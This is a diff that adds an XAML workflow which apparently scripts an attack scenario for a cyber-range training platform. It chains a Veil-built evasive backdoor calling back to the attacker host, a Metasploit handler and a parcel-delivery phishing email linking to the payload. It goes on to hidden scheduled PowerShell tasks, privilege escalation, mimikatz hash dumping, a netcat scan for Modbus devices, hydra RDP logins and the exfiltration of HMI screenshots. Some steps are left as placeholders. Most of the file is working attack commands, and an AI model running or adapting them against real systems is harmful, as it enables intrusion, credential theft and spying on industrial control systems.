@@ -1,0 +1,356 @@
+﻿<RootSequence DisplayName="Scenario" SdkUtils.TargetSdkVersion="1.0.0" xmlns="http://schemas.cyberbit.com/CyberTrainer/SDK/Activities" xmlns:csaiv="clr-namespace:CyberTrainer.SDK.Activities.Implementations.VCenter;assembly=CyberTrainer.SDK.Activities" xmlns:ecsiscm="clr-namespace:Elbit.CyberTrainer.Shared.Infrastructure.SDK.Contracts.Models;assembly=Elbit.CyberTrainer.Shared.Infrastructure" xmlns:p="http://schemas.microsoft.com/netfx/2009/xaml/activities" xmlns:s="clr-namespace:System;assembly=mscorlib" xmlns:scg="clr-namespace:System.Collections.Generic;assembly=mscorlib" xmlns:sco="clr-namespace:System.Collections.ObjectModel;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+  <RootSequence.Variables>
+    <p:Variable x:TypeArguments="x:String" Default="199.203.100.239" Name="ASInternalIP" />
+    <p:Variable x:TypeArguments="x:String" Default="Office" Name="VeilOutputName" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="OldSessions" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="NewSessionID" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="ExplorerPID" />
+    <p:Variable x:TypeArguments="s:String[]" Name="Shares" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="Share" />
+    <p:Variable x:TypeArguments="s:String[]" Name="Files" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="File" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="FileData" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="NewFile" />
+    <p:Variable x:TypeArguments="x:String" Default="199.203.100.99" Name="MailServer" />
+    <p:Variable x:TypeArguments="x:String" Default="NewAdmin" Name="NewUserOnDomain" />
+    <p:Variable x:TypeArguments="x:String" Default="P@ssw0rd" Name="NewUserOnDomainPassword" />
+    <p:Variable x:TypeArguments="x:String" Default="192.168.214.4" Name="MsSQLAddress" />
+    <p:Variable x:TypeArguments="x:String" Default="SQLUserAdmin" Name="NewSqlUser" />
+    <p:Variable x:TypeArguments="x:String" Default="P@ssw0rd" Name="NewSqlUserPassword" />
+    <p:Variable x:TypeArguments="x:String" Default="TechDB" Name="DBName" />
+    <p:Variable x:TypeArguments="x:String" Default="\\cnt-files" Name="FileServerName" />
+    <p:Variable x:TypeArguments="x:String" Default="[Nothing]" Name="OutputResult" />
+    <p:Variable x:TypeArguments="x:String" Default="WS-Win10-CNT4_C" Name="TargetMachine" />
+    <p:Variable x:TypeArguments="x:String" Default="GSC_label_E727D5151D.exe" Name="PayloadFile" />
+  </RootSequence.Variables>
+  <Sequence DisplayName="Step 0: Init Network">
+    <ConfigureNetwork DisplayName="Initializes the Network Settings" IP="[ASInternalIP]" InterfaceName="eth1" VlanName="Internet">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings>
+          <ActivitySettings.NetworkMapHintInfo>
+            <NetworkMapHintInfo From="Internet-AS" Message="Setting Up Network" />
+          </ActivitySettings.NetworkMapHintInfo>
+          <ActivitySettings.TimelineMessageAfter>
+            <TimelineMessageInfo Message="Internal IP Has Been Set to - ${ASInternalIP}" Severity="Info" />
+          </ActivitySettings.TimelineMessageAfter>
+          <ActivitySettings.TimelineMessageBefore>
+            <TimelineMessageInfo Message="Setting Up Network" Severity="Info" />
+          </ActivitySettings.TimelineMessageBefore>
+          <ActivitySettings.ValidationErrorHandlingInfo>
+            <ErrorHandlingInfo CustomErrorMessage="Error while trying to configure network to internet segment" RetryLimit="5" RetryOnError="True" RetryTimeout="00:00:25" />
+          </ActivitySettings.ValidationErrorHandlingInfo>
+        </ActivitySettings>
+      </ActivityUtils.ActivitySettings>
+    </ConfigureNetwork>
+  </Sequence>
+  <Sequence DisplayName="Step 1: Sending phishing email">
+    <Sequence DisplayName="Create veil">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings>
+          <ActivitySettings.TimelineMessageBefore>
+            <TimelineMessageInfo Message="Creating Backdoor File" Severity="Info" />
+          </ActivitySettings.TimelineMessageBefore>
+        </ActivitySettings>
+      </ActivityUtils.ActivitySettings>
+      <WriteCommandAS CommandText="[&quot;cd /TOOLS/Veil/;echo -e &quot;&quot;\n&quot;&quot;| ./Veil.py --config;/TOOLS/Veil/Veil.py -t Evasion --ip &quot; + ASInternalIP + &quot; --port 443 -p 11 -c INJECT_METHOD=Heap -o &quot; + VeilOutputName]" DisplayName="Create Veil File">
+        <ActivityUtils.ActivitySettings>
+          <ActivitySettings />
+        </ActivityUtils.ActivitySettings>
+      </WriteCommandAS>
+      <WriteCommandAS CommandText="[&quot;mv /var/lib/veil/output/compiled/Office.exe &quot; + &quot;/var/www/html/download/&quot; + PayloadFile]" DisplayName="Copy Veil File to Download">
+        <ActivityUtils.ActivitySettings>
+          <ActivitySettings />
+        </ActivityUtils.ActivitySettings>
+      </WriteCommandAS>
+      <WriteCommandAS CommandText="[&quot;rm &quot; + &quot;/var/lib/veil/output/compiled/&quot; + VeilOutputName + &quot;.exe;&quot; + System.Environment.NewLine + &quot;rm &quot; + &quot;/var/lib/veil/output/source/&quot; + VeilOutputName + &quot;.c;&quot; + System.Environment.NewLine + &quot;rm &quot; + &quot;/var/lib/veil/output/handlers/&quot; + VeilOutputName + &quot;.rc&quot;]" DisplayName="Delete Veil Files" />
+    </Sequence>
+    <WaitForNewTarget DisplayName="Listen for New Target " Listener="[&quot;use exploit/multi/handler&quot; + System.Environment.NewLine + &quot;set LHOST &quot; + ASInternalIP + System.Environment.NewLine + &quot;set LPORT 443&quot; + System.Environment.NewLine + &quot;exploit -j&quot;]" TimeoutInMinutes="10">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings>
+          <ActivitySettings.ResultDescriptors>
+            <scg:List x:TypeArguments="ecsiscm:IResultDescriptor" Capacity="4">
+              <ResultDescriptor ResultValidations="{x:Null}" Regex="\d*" TargetVariableName="NewSessionID" />
+            </scg:List>
+          </ActivitySettings.ResultDescriptors>
+          <ActivitySettings.TimelineMessageBefore>
+            <TimelineMessageInfo Message="Creating Listener" Severity="Info" />
+          </ActivitySettings.TimelineMessageBefore>
+          <ActivitySettings.ValidationErrorHandlingInfo>
+            <ErrorHandlingInfo CustomErrorMessage="Failed. No session found" RetryOnError="True" RetryTimeout="00:00:15" />
+          </ActivitySettings.ValidationErrorHandlingInfo>
+        </ActivitySettings>
+      </ActivityUtils.ActivitySettings>
+      <SMTPSendMail Attachments="C:\CyberTrainer\Common\TrojanSharePE\GSC_logo.png" Body="[&quot;&lt;html&gt;&quot; + System.Environment.NewLine + &quot;&lt;table border=&quot;&quot;0&quot;&quot; cellpadding=&quot;&quot;0&quot;&quot; cellspacing=&quot;&quot;0&quot;&quot; width=&quot;&quot;&quot;&quot;&gt;&quot; + System.Environment.NewLine + &quot;  &lt;tbody&gt;&quot; + System.Environment.NewLine + &quot;    &lt;tr&gt;&quot; + System.Environment.NewLine + &quot;      &lt;td height=&quot;&quot;0&quot;&quot;&gt;&quot; + System.Environment.NewLine + &quot;      &lt;/td&gt;&quot; + System.Environment.NewLine + &quot;    &lt;/tr&gt;&quot; + System.Environment.NewLine + &quot;        &lt;tr&gt;&quot; + System.Environment.NewLine + &quot;      &lt;td border=&quot;&quot;0&quot;&quot; cellpadding=&quot;&quot;0&quot;&quot; cellspacing=&quot;&quot;0&quot;&quot; height=&quot;&quot;0&quot;&quot; width=&quot;&quot;0&quot;&quot;&gt;&quot; + System.Environment.NewLine + &quot;        &lt;span lang=RU style='mso-fareast-language:#2000'&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;&lt;span lang=EN-US style='mso-fareast-language:#2000'&gt;&lt;img border=0 width=500 height=110 style='width:1.9166in;height:.4791in' id=&quot;&quot;Picture_x0020_1&quot;&quot; src=&quot;&quot;cid:GSC_logo.png&quot;&quot; alt=&quot;&quot;cid:GSC_logo.png&quot;&quot;&gt;&lt;/span&gt;&quot; + System.Environment.NewLine + &quot;      &lt;/td&gt;&quot; + System.Environment.NewLine + &quot;    &lt;/tr&gt;&quot; + System.Environment.NewLine + &quot;    &lt;tr&gt;&quot; + System.Environment.NewLine + &quot;      &lt;td height=&quot;&quot;50&quot;&quot;&gt;&quot; + System.Environment.NewLine + &quot;      &lt;/td&gt;&quot; + System.Environment.NewLine + &quot;    &lt;/tr&gt;&quot; + System.Environment.NewLine + &quot;  &lt;/tbody&gt;&quot; + System.Environment.NewLine + &quot;&lt;/table&gt;&quot; + System.Environment.NewLine + &quot;&lt;head&gt;&quot; + System.Environment.NewLine + &quot; &lt;title&gt;&lt;/title&gt;&quot; + System.Environment.NewLine + &quot;&lt;/head&gt;&quot; + System.Environment.NewLine + &quot;&lt;body&gt;&quot; + System.Environment.NewLine + &quot;&lt;p style=&quot;&quot;margin-left:13.5pt;&quot;&quot;&gt;Hi User082,&lt;br /&gt;&quot; + System.Environment.NewLine + &quot;&lt;br /&gt;&quot; + System.Environment.NewLine + &quot;Your package arrived at the post office. Here is your Shipping Document/Invoice and copy of GSC receipt for your tracking which includes the bill of lading and GSC tracking number, the new Import/Export policy supplied by GSC Express. Please kindly check the attached to confirm accordingly if your address is correct, before we submit to our outlet office for dispatch to your destination.&lt;/p&gt;&quot; + System.Environment.NewLine + &quot;&quot; + System.Environment.NewLine + &quot;&lt;p style=&quot;&quot;margin-left:13.5pt;&quot;&quot;&gt;&lt;strong&gt;Label Number: E727D5151D&lt;br /&gt;&quot; + System.Environment.NewLine + &quot;Class: Package Services&lt;br /&gt;&quot; + System.Environment.NewLine + &quot;Service(s): Delivery Confirmation&lt;br /&gt;&quot; + System.Environment.NewLine + &quot;Status: eNotification sent&lt;/strong&gt;&lt;/p&gt;&quot; + System.Environment.NewLine + &quot;&quot; + System.Environment.NewLine + &quot;&lt;p&gt;&lt;a &quot; + &quot;href=&quot;&quot;&quot; + ASInternalIP + &quot;/download/&quot; + PayloadFile + &quot;&quot;&quot;&gt;View&quot; + &quot; or download here&lt;/a&gt; for the full statement information and a full description of package.&lt;/p&gt;&quot; + System.Environment.NewLine + &quot;&quot; + System.Environment.NewLine + &quot;&lt;p style=&quot;&quot;margin-left:13.5pt;&quot;&quot;&gt;Your item will arrive from 2-5 days time.&lt;br /&gt;&quot; + System.Environment.NewLine + &quot;We would like to thank you for using the services of GSC Express.&lt;br /&gt;&quot; + System.Environment.NewLine + &quot;&amp;nbsp;&lt;/p&gt;&quot; + System.Environment.NewLine + &quot;&quot; + System.Environment.NewLine + &quot;&lt;/body&gt;&quot; + System.Environment.NewLine + &quot;&lt;/html&gt;&quot;]" DisplayName="Send Infected E-mail" FromAddress="JohnSmith@gmail.com" Password="P@ssw0rd" SMTPPort="25" SMTPServer="[MailServer]" Subject="Tracking Update #E727D5151D" ToAddress="User082@services.dom" Username="JohnSmith">
+        <ActivityUtils.ActivitySettings>
+          <ActivitySettings>
+            <ActivitySettings.NetworkMapHintInfo>
+              <NetworkMapHintInfo From="Internet-AS" Message="Sending Infected E-mail" To="WS-Win10-Cnt4" />
+            </ActivitySettings.NetworkMapHintInfo>
+            <ActivitySettings.TimelineMessageAfter>
+              <TimelineMessageInfo Message="Waiting for Trojan to Contact Home" Severity="Info" />
+            </ActivitySettings.TimelineMessageAfter>
+            <ActivitySettings.TimelineMessageBefore>
+              <TimelineMessageInfo Message="Sending Infected E-mail" Severity="Info" />
+            </ActivitySettings.TimelineMessageBefore>
+          </ActivitySettings>
+        </ActivityUtils.ActivitySettings>
+      </SMTPSendMail>
+      <Sequence DisplayName="Part 2: Automate user downloading file">
+        <ActivityUtils.ActivitySettings>
+          <ActivitySettings>
+            <ActivitySettings.TimelineMessageBefore>
+              <TimelineMessageInfo Message="Run Automated User Action on Target" />
+            </ActivitySettings.TimelineMessageBefore>
+          </ActivitySettings>
+        </ActivityUtils.ActivitySettings>
+        <csaiv:CopyFileToMachine Timeout="{x:Null}" DestinationPath="C:\ProgramData\Weaponizing.ps1" DisplayName="Copy Gray Action script" MachineName="[TargetMachine]" Password="P@ssw0rd" SourcePath="C:\CyberTrainer\Common\GrayActions\TrojanSharePE\GaWin10.ps1" UserName="User082@services.dom" />
+        <ExecuteTaskOnMachine Arguments="schtasks /Create /SC MINUTE /MO 1 /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -executionpolicy bypass -file C:\ProgramData\Weaponizing.ps1 -windowstyle hidden' /TN MicrosoftPowerShellUpdaterTask" DisplayName="Create Task" FilePath="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" FolderPath="IP network CP+ArcSight\LAN_Users" LoginPassword="P@ssw0rd" LoginUserName="User082@services.dom" MachineName="[TargetMachine]" SleepInSeconds="10">
+          <ActivityUtils.ActivitySettings>
+            <ActivitySettings DelayAfter="00:02:00" />
+          </ActivityUtils.ActivitySettings>
+        </ExecuteTaskOnMachine>
+        <ExecuteTaskOnMachine Arguments="/C del /f C:\ProgramData\Weaponizing.ps1" DisplayName="Remove GA Script" FilePath="C:\Windows\System32\cmd.exe" FolderPath="IP network CP+ArcSight\LAN_Users" LoginPassword="P@ssw0rd" LoginUserName="User082@services.dom" MachineName="[TargetMachine]" SleepInSeconds="10">
+          <ActivityUtils.ActivitySettings>
+            <ActivitySettings DelayAfter="00:00:00" />
+          </ActivityUtils.ActivitySettings>
+        </ExecuteTaskOnMachine>
+      </Sequence>
+    </WaitForNewTarget>
+  </Sequence>
+  <Sequence DisplayName="Part 3: Create Watchdog process using WMI">
+    <ActivityUtils.ActivitySettings>
+      <ActivitySettings Description="PWC will do." />
+    </ActivityUtils.ActivitySettings>
+    <MeterpreterSession DisplayName="Command" SessionID="[NewSessionID]" />
+  </Sequence>
+  <Sequence DisplayName="Part 4: Privilege Escalation">
+    <Sequence DisplayName="Local Privilege Escalation">
+      <MeterpreterSession DisplayName="Interact with meterpreter session on target" SessionID="[NewSessionID]">
+        <ActivityUtils.ActivitySettings>
+          <ActivitySettings>
+            <ActivitySettings.TimelineMessageAfter>
+              <TimelineMessageInfo Message="Attack Flow Completed" />
+            </ActivitySettings.TimelineMessageAfter>
+          </ActivitySettings>
+        </ActivityUtils.ActivitySettings>
+        <MeterpreterCommand WaitInSeconds="{x:Null}" Command="sysinfo" DisplayName="Get System Info">
+          <ActivityUtils.ActivitySettings>
+            <ActivitySettings>
+              <ActivitySettings.TimelineMessageBefore>
+                <TimelineMessageInfo Message="Session to target opened" />
+              </ActivitySettings.TimelineMessageBefore>
+            </ActivitySettings>
+          </ActivityUtils.ActivitySettings>
+        </MeterpreterCommand>
+        <MeterpreterCommand WaitInSeconds="{x:Null}" Command="getuid" DisplayName="Get Current User" />
+        <MeterpreterCommand Command="getsystem" DisplayName="Get System Privileges" WaitInSeconds="30">
+          <ActivityUtils.ActivitySettings>
+            <ActivitySettings DelayAfter="00:00:30">
+              <ActivitySettings.ResultDescriptors>
+                <scg:List x:TypeArguments="ecsiscm:IResultDescriptor" Capacity="4">
+                  <ResultDescriptor Regex="got\s+system\s+via" TargetVariableName="getsystemValidation">
+                    <ResultDescriptor.ResultValidations>
+                      <scg:List x:TypeArguments="ecsiscm:IResultValidation" Capacity="4">
+                        <ResultValidation Condition="Not Contains" ErrorMessage="Privilege escalation unsuccessful. Retrying privilege escalation" Value="got system via">
+                          <ResultValidation.Parent>
+                            <ResultDescriptor x:Name="__ReferenceID1" Regex=".*" TargetVariableName="getsystemValidation">
+                              <ResultDescriptor.ResultValidations>
+                                <sco:ObservableCollection x:TypeArguments="ecsiscm:IResultValidation">
+                                  <ResultValidation Parent="{x:Reference __ReferenceID1}" TimelineMessage="{x:Reference __ReferenceID0}" Condition="Not Contains" ErrorMessage="failed to get system" Value="got system via" />
+                                </sco:ObservableCollection>
+                              </ResultDescriptor.ResultValidations>
+                            </ResultDescriptor>
+                          </ResultValidation.Parent>
+                          <ResultValidation.TimelineMessage>
+                            <TimelineMessageInfo x:Name="__ReferenceID0" Severity="Error" />
+                          </ResultValidation.TimelineMessage>
+                        </ResultValidation>
+                      </scg:List>
+                    </ResultDescriptor.ResultValidations>
+                  </ResultDescriptor>
+                </scg:List>
+              </ActivitySettings.ResultDescriptors>
+              <ActivitySettings.TimelineMessageBefore>
+                <TimelineMessageInfo Message="Performing privilege escalation" />
+              </ActivitySettings.TimelineMessageBefore>
+              <ActivitySettings.ValidationErrorHandlingInfo>
+                <ErrorHandlingInfo CustomErrorMessage="Privilege escalation failed" RetryLimit="3" RetryOnError="True" RetryTimeout="00:00:05" />
+              </ActivitySettings.ValidationErrorHandlingInfo>
+            </ActivitySettings>
+          </ActivityUtils.ActivitySettings>
+        </MeterpreterCommand>
+      </MeterpreterSession>
+    </Sequence>
+    <Sequence DisplayName="Domain Privilege Escalation">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings Description="" />
+      </ActivityUtils.ActivitySettings>
+      <MeterpreterCommand Command="load kiwi" DisplayName="Load mimikatz" WaitInSeconds="60">
+        <ActivityUtils.ActivitySettings>
+          <ActivitySettings DelayAfter="00:00:30">
+            <ActivitySettings.ResultDescriptors>
+              <scg:List x:TypeArguments="ecsiscm:IResultDescriptor" Capacity="4">
+                <ResultDescriptor Regex="mimikatz" TargetVariableName="LoadKiwiValidation">
+                  <ResultDescriptor.ResultValidations>
+                    <scg:List x:TypeArguments="ecsiscm:IResultValidation" Capacity="4">
+                      <ResultValidation Condition="Not Contains" ErrorMessage="Error in load mimikatz. Retrying to load mimikatz" Value="mimikatz">
+                        <ResultValidation.Parent>
+                          <ResultDescriptor x:Name="__ReferenceID3" Regex="mimikatz" TargetVariableName="LoadKiwiValidation">
+                            <ResultDescriptor.ResultValidations>
+                              <sco:ObservableCollection x:TypeArguments="ecsiscm:IResultValidation">
+                                <ResultValidation Parent="{x:Reference __ReferenceID3}" TimelineMessage="{x:Reference __ReferenceID2}" Condition="Not Contains" ErrorMessage="Failed to load mimikatz" Value="mimikatz" />
+                              </sco:ObservableCollection>
+                            </ResultDescriptor.ResultValidations>
+                          </ResultDescriptor>
+                        </ResultValidation.Parent>
+                        <ResultValidation.TimelineMessage>
+                          <TimelineMessageInfo x:Name="__ReferenceID2" Severity="Error" />
+                        </ResultValidation.TimelineMessage>
+                      </ResultValidation>
+                    </scg:List>
+                  </ResultDescriptor.ResultValidations>
+                </ResultDescriptor>
+              </scg:List>
+            </ActivitySettings.ResultDescriptors>
+            <ActivitySettings.TimelineMessageBefore>
+              <TimelineMessageInfo Message="Loading mimikatz" />
+            </ActivitySettings.TimelineMessageBefore>
+            <ActivitySettings.ValidationErrorHandlingInfo>
+              <ErrorHandlingInfo CustomErrorMessage="Failed to load mimikatz" RetryLimit="3" RetryOnError="True" RetryTimeout="00:00:05" />
+            </ActivitySettings.ValidationErrorHandlingInfo>
+          </ActivitySettings>
+        </ActivityUtils.ActivitySettings>
+      </MeterpreterCommand>
+      <MeterpreterCommand WaitInSeconds="{x:Null}" Command="lsa_dump_sam" DisplayName="Dump Hashes">
+        <ActivityUtils.ActivitySettings>
+          <ActivitySettings DelayAfter="00:00:30">
+            <ActivitySettings.ResultDescriptors>
+              <scg:List x:TypeArguments="ecsiscm:IResultDescriptor" Capacity="4">
+                <ResultDescriptor ResultValidations="{x:Null}" Regex="ntlm\s*-\s+1:\s+([a-fA-F0-9]+)" TargetVariableName="Administrator_NTLM_Hash" />
+                <ResultDescriptor Regex="Dumping\s+SAM" TargetVariableName="hashdumpValidation">
+                  <ResultDescriptor.ResultValidations>
+                    <scg:List x:TypeArguments="ecsiscm:IResultValidation" Capacity="4">
+                      <ResultValidation Condition="Not Contains" ErrorMessage="Hash not retrieved. Retrying hash dump" Value="Dumping SAM">
+                        <ResultValidation.Parent>
+                          <ResultDescriptor x:Name="__ReferenceID5" Regex="Dumping\s+SAM" TargetVariableName="hashdumpValidation">
+                            <ResultDescriptor.ResultValidations>
+                              <sco:ObservableCollection x:TypeArguments="ecsiscm:IResultValidation">
+                                <ResultValidation Parent="{x:Reference __ReferenceID5}" TimelineMessage="{x:Reference __ReferenceID4}" Condition="Not Contains" ErrorMessage="Hash not retrieved" Value="Dumping SAM" />
+                              </sco:ObservableCollection>
+                            </ResultDescriptor.ResultValidations>
+                          </ResultDescriptor>
+                        </ResultValidation.Parent>
+                        <ResultValidation.TimelineMessage>
+                          <TimelineMessageInfo x:Name="__ReferenceID4" Severity="Error" />
+                        </ResultValidation.TimelineMessage>
+                      </ResultValidation>
+                    </scg:List>
+                  </ResultDescriptor.ResultValidations>
+                </ResultDescriptor>
+              </scg:List>
+            </ActivitySettings.ResultDescriptors>
+            <ActivitySettings.TimelineMessageAfter>
+              <TimelineMessageInfo Message="NTLM password hash for administrator retrieved: ${Administrator_NTLM_Hash}" />
+            </ActivitySettings.TimelineMessageAfter>
+            <ActivitySettings.TimelineMessageBefore>
+              <TimelineMessageInfo Message="Performing hash dump" />
+            </ActivitySettings.TimelineMessageBefore>
+            <ActivitySettings.ValidationErrorHandlingInfo>
+              <ErrorHandlingInfo CustomErrorMessage="Hash dump failed" RetryLimit="3" RetryOnError="True" RetryTimeout="00:00:05" />
+            </ActivitySettings.ValidationErrorHandlingInfo>
+          </ActivitySettings>
+        </ActivityUtils.ActivitySettings>
+      </MeterpreterCommand>
+    </Sequence>
+  </Sequence>
+  <Sequence DisplayName="Part 5: Defense Evasion: Freeze processes such as Task Manager, Process Explorer">
+    <ActivityUtils.ActivitySettings>
+      <ActivitySettings Description="PWC will do." />
+    </ActivityUtils.ActivitySettings>
+  </Sequence>
+  <Sequence DisplayName="Part 6: Port scan network to find HMI machine">
+    <MeterpreterCommand WaitInSeconds="{x:Null}" Command="ipconfig" DisplayName="Get Machine IP and Network Address">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings>
+          <ActivitySettings.ResultDescriptors>
+            <scg:List x:TypeArguments="ecsiscm:IResultDescriptor" Capacity="4">
+              <ResultDescriptor ResultValidations="{x:Null}" Regex="IPv4\s+Address\s+:\s+(?!127\.0\.0\.1)(\d+\.\d+\.\d+)" TargetVariableName="UsersSubnet" />
+              <ResultDescriptor Regex="IPv4\s+Address\s+:\s+(?!127\.0\.0\.1)(\d+\.\d+\.\d+\.\d+)" TargetVariableName="PationZeroIP">
+                <ResultDescriptor.ResultValidations>
+                  <scg:List x:TypeArguments="ecsiscm:IResultValidation" Capacity="4">
+                    <ResultValidation Condition="Not Contains" ErrorMessage="IP not found. Retrying command 'ipconfig'" Value="192.168.100.12">
+                      <ResultValidation.Parent>
+                        <ResultDescriptor x:Name="__ReferenceID7" Regex="IPv4\s+Address\s+:\s+(?!127\.0\.0\.1)(\d+\.\d+\.\d+\.\d+)" TargetVariableName="PationZeroIP">
+                          <ResultDescriptor.ResultValidations>
+                            <sco:ObservableCollection x:TypeArguments="ecsiscm:IResultValidation">
+                              <ResultValidation Parent="{x:Reference __ReferenceID7}" TimelineMessage="{x:Reference __ReferenceID6}" Condition="Not Contains" ErrorMessage="Failed to get IP" Value="192.168.100.12" />
+                            </sco:ObservableCollection>
+                          </ResultDescriptor.ResultValidations>
+                        </ResultDescriptor>
+                      </ResultValidation.Parent>
+                      <ResultValidation.TimelineMessage>
+                        <TimelineMessageInfo x:Name="__ReferenceID6" Severity="Error" />
+                      </ResultValidation.TimelineMessage>
+                    </ResultValidation>
+                  </scg:List>
+                </ResultDescriptor.ResultValidations>
+              </ResultDescriptor>
+            </scg:List>
+          </ActivitySettings.ResultDescriptors>
+          <ActivitySettings.ValidationErrorHandlingInfo>
+            <ErrorHandlingInfo CustomErrorMessage="Failed to get host IP" RetryLimit="3" RetryOnError="True" RetryTimeout="00:00:05" />
+          </ActivitySettings.ValidationErrorHandlingInfo>
+        </ActivitySettings>
+      </ActivityUtils.ActivitySettings>
+    </MeterpreterCommand>
+    <MeterpreterCommand WaitInSeconds="{x:Null}" Command="upload /usr/share/windows-resources/binaries/nc.exe [fill in]\\nc.exe" DisplayName="Upload NC to Patient 0">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings Description="Fill in upload path" />
+      </ActivityUtils.ActivitySettings>
+    </MeterpreterCommand>
+    <ShellCommand WaitInSeconds="{x:Null}" Command="for /L %i in (1,1,255) do @for /L %j in (1,1,255) do @nc.exe -v -w 2 -z 502 192.168.%i.%j" />
+  </Sequence>
+  <Sequence DisplayName="Part 7: Connect to HMI (RDP/VNC)">
+    <ActivityUtils.ActivitySettings>
+      <ActivitySettings Description="PWC will do. Below is an option to mimic login." />
+    </ActivityUtils.ActivitySettings>
+    <MeterpreterCommand WaitInSeconds="{x:Null}" Command="portfwd add –l 3389 –p 3389 –r [IP]" DisplayName="Add port forward to RDP on HMI" />
+    <WriteCommandAS CommandText="hydra -t 1 -V -f -l [username] -p [password] rdp://127.0.0.1" DisplayName="Mimic login with hydra" />
+  </Sequence>
+  <Sequence DisplayName="Part 8: Taking screen captures of HMI">
+    <csaiv:CopyFileToMachine SourcePath="{x:Null}" Timeout="{x:Null}" DestinationPath="C:\Users\user067\AppData\Local\Temp\updater.ps1" DisplayName="Copy Snapshot Script to HMI" MachineName="HMI name" Password="P@ssw0rd" UserName="User082@services.dom" />
+    <ExecuteTaskOnMachine Arguments="/C C:\Users\user067\AppData\Local\Temp\updater.ps1" DisplayName="Execute Snapshot script" FilePath="C:\Windows\System32\cmd.exe" FolderPath="IP network CP+ArcSight\LAN_Users" LoginPassword="P@ssw0rd" LoginUserName="User082@services.dom" MachineName="[TargetMachine]" SleepInSeconds="10">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings DelayAfter="00:00:00" />
+      </ActivityUtils.ActivitySettings>
+    </ExecuteTaskOnMachine>
+    <MeterpreterShellCommand Command="schtasks /Create /SC MINUTE /MO 1 /TR &quot;powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ExecutionPolicy bypass -File C:\Users\User067\AppData\Local\Temp\updater.ps1&quot; /TN &quot;Microsoft PowerShell Updater Task&quot;" DisplayName="Generate Schedule Task to run snapshot script every 1 minute" WaitInSeconds="300">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings>
+          <ActivitySettings.NetworkMapHintInfo>
+            <NetworkMapHintInfo Message="Generate schedule to move uploaded screenshots from HMI to IIS machine" />
+          </ActivitySettings.NetworkMapHintInfo>
+          <ActivitySettings.TimelineMessageBefore>
+            <TimelineMessageInfo Message="Generate schedule to move uploaded screenshots from HMI to IIS machine" />
+          </ActivitySettings.TimelineMessageBefore>
+        </ActivitySettings>
+      </ActivityUtils.ActivitySettings>
+    </MeterpreterShellCommand>
+  </Sequence>
+  <Sequence DisplayName="Part 9 A: Download screen captures through open port">
+    <ExecuteTaskOnMachine Arguments="/C &quot;net share Docs=E:\Documents /grant:everyone,FULL&quot;" DisplayName="Create image share on HMI" FilePath="C:\Windows\System32\cmd.exe" FolderPath="IP network CP+ArcSight\LAN_Users" LoginPassword="P@ssw0rd" LoginUserName="User082@services.dom" MachineName="[TargetMachine]" SleepInSeconds="10">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings DelayAfter="00:00:00" />
+      </ActivityUtils.ActivitySettings>
+    </ExecuteTaskOnMachine>
+    <MeterpreterShellCommand WaitInSeconds="{x:Null}" Command="net use \\[IP]\sharename" DisplayName="Connect to share from Patient 0" />
+    <MeterpreterShellCommand WaitInSeconds="{x:Null}" Command="cmd.exe /c powershell -c &quot;Move-Item \\IP\\sharename destination&quot;" DisplayName="Move images from HMI to patient 0">
+      <ActivityUtils.ActivitySettings>
+        <ActivitySettings Description=" \\" />
+      </ActivityUtils.ActivitySettings>
+    </MeterpreterShellCommand>
+    <MeterpreterCommand WaitInSeconds="{x:Null}" Command="download -r [path on patient 0 (with \\)] [path on kali to download to]" DisplayName="Move images from patient 0 to Kali" />
+  </Sequence>
+  <Sequence DisplayName="Part 9 B: Transfer malware to HMI" />
+  <Sequence />
+</RootSequence>
